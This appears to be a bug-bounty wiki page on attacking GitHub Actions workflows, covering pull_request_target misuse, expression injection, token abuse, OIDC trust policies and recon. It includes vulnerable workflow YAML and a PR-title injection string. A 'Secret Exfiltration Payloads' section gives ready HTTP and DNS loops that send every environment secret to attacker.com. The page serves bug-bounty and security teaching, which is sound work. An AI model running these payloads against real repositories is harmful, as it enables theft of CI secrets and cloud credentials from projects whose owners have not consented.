> Source: https://bugbounty.info/Attack-Surface/CI-CD/GitHub-Actions

# GitHub Actions

GitHub Actions is everywhere and it has a genuinely nuanced security model that most developers don't fully understand. The `pull_request_target` trigger is the most dangerous misconfig - it runs in the context of the base repo with access to secrets, even when triggered by a fork PR. That's an RCE-equivalent for anyone who can open a pull request.

## The pull_request_target Problem

`pull_request` runs in the context of the fork - no secrets, read-only token. Safe for untrusted contributions.

`pull_request_target` runs in the context of the *base* repo - full secrets, read-write `GITHUB_TOKEN`. Designed for things like labeling PRs or posting comments from automation. Dangerous when it also checks out the PR's code.

```yaml
# VULNERABLE: checks out PR code and runs it with secrets
on: pull_request_target
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # <-- PR's code
      - run: npm install && npm test                       # <-- executes attacker code
        env:
          SECRET_KEY: ${{ secrets.SECRET_KEY }}           # <-- secret exposed
```

To exploit this: fork the repo, modify a build step or test file to exfiltrate secrets, open a PR against the base repo. The workflow runs your code with the base repo's secrets.

```bash
# Payload to add to a test file or build script
curl -s https://attacker.com/collect -d "$(env | base64)"
# Or exfil to a DNS query for stealthier collection
```

## Workflow Injection

When workflow files use `${{ github.event.* }}` values directly in `run:` steps, that's expression injection. The event data comes from the PR/issue/commit and an attacker controls it.

```yaml
# VULNERABLE: PR title flows into shell command
- name: Comment on PR
  run: |
    echo "PR title: ${{ github.event.pull_request.title }}"
```

If I create a PR with the title `"; curl https://attacker.com/$(cat /proc/1/environ | base64) #"`, that executes in the runner context.

Look for these patterns in workflow files:

```bash
# Search public repos for vulnerable patterns
github.event.pull_request.title
github.event.pull_request.body
github.event.pull_request.head.ref
github.event.issue.title
github.event.comment.body
github.head_ref
```

## GITHUB_TOKEN Abuse

Every workflow gets a `GITHUB_TOKEN` automatically. Its permissions depend on the repo's default settings and the workflow's `permissions:` block. Common findings:

1. **Token has write access when it shouldn't** - can push code, create releases, approve PRs
2. **Token used to access other repos in org** - if org settings allow GITHUB_TOKEN to access other repos
3. **Token permissions not minimized** - `permissions: write-all` in workflow file

```yaml
# Check what permissions a token has
- name: Check token
  run: |
    curl -H "Authorization: token ${{ github.token }}" \
      https://api.github.com/repos/${{ github.repository }}
```

## Secret Exfiltration Payloads

Once you have code execution in a workflow, exfil all secrets:

```bash
# Option 1: HTTP exfil
env | base64 | xargs -I{} curl "https://attacker.com/collect?d={}"
 
# Option 2: DNS exfil (bypasses HTTP egress restrictions sometimes)
for var in $(env | cut -d= -f1); do
  val=$(printenv $var | base64 | tr -d '\n')
  # Split into 63-char chunks for DNS labels
  host "${val:0:60}.attacker.com"
done
 
# Option 3: Via artifact (if exfil is blocked but artifacts upload works)
env > /tmp/secrets.txt
# Use actions/upload-artifact to store it
```

## OIDC and Cloud Credentials

Modern GitHub Actions workflows don't use static secrets for cloud access - they use OIDC to assume roles. This is more secure but worth auditing:

```yaml
# Workflow assuming an AWS role via OIDC
- uses: aws-actions/configure-aws-credentials@v2
  with:
    role-to-assume: arn:aws:iam::123456789:role/my-role
    aws-region: us-east-1
```

Check the trust policy on that AWS role:

```json
{
  "Condition": {
    "StringLike": {
      "token.actions.githubusercontent.com:sub": "repo:org/repo:*"
    }
  }
}
```

If the condition is too broad (`repo:org/*` or just `*`), any repo in the org can assume that role. If you can trigger a workflow in any repo in the org, you get the cloud credentials.

## Recon on Workflow Files

```bash
# Find vulnerable patterns with GitHub search (in scope repos)
# site:github.com/TARGET "pull_request_target" "actions/checkout"
 
# Clone and grep locally
git clone https://github.com/target/repo
grep -r "pull_request_target" .github/workflows/
grep -r 'github.event.pull_request.title\|github.event.issue.title\|github.head_ref' .github/workflows/
 
# Check for pinned vs unpinned actions (supply chain risk)
grep -r "uses:" .github/workflows/ | grep -v "@[a-f0-9]\{40\}"
```

## Public Reports

- pull_request_target workflow injection leading to secret exfiltration on Rust lang - [HackerOne #1520106](https://hackerone.com/reports/1520106)
- GitHub Actions expression injection via issue title in workflow run step - [HackerOne #1489813](https://hackerone.com/reports/1489813)
- GITHUB_TOKEN with write permissions allows pushing to protected branch - [HackerOne #1615012](https://hackerone.com/reports/1615012)
- OIDC trust policy too broad allows any repo in org to assume production AWS role - [HackerOne Hacktivity search](https://hackerone.com/hacktivity?querystring=github+actions+oidc)
- Unpinned Actions dependency in workflow enables supply chain code execution - [HackerOne #1536163](https://hackerone.com/reports/1536163)

## Related

- [Secret Leakage](../../Attack-Surface/CI-CD/Secret-Leakage) - secrets in build logs and artifacts
- [CD Overview](../../)
- [AWS IAM Privesc](../../Attack-Surface/Cloud/AWS/IAM-Privilege-Escalation) - what to do with OIDC-derived cloud creds
